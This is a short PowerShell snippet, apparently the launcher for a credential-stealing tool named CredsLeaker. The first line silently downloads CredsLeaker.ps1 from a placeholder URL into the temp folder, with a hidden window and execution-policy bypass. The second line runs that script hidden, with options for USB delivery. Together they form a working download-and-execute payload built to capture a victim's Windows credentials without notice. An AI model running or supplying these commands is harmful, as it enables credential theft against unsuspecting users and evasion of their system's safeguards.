powershell -NoP -NonI -W Hidden -Exec Bypass "Invoke-RestMethod -uri "http://YOUR_URL/CredsLeaker.ps1" -OutFile $env:TEMP\lolz.ps1"; 

Powershell.exe -ExecutionPolicy bypass -Windowstyle hidden -noninteractive -nologo -file %TEMP%\lolz.ps1 -mode "dynamic" -delivery "usb"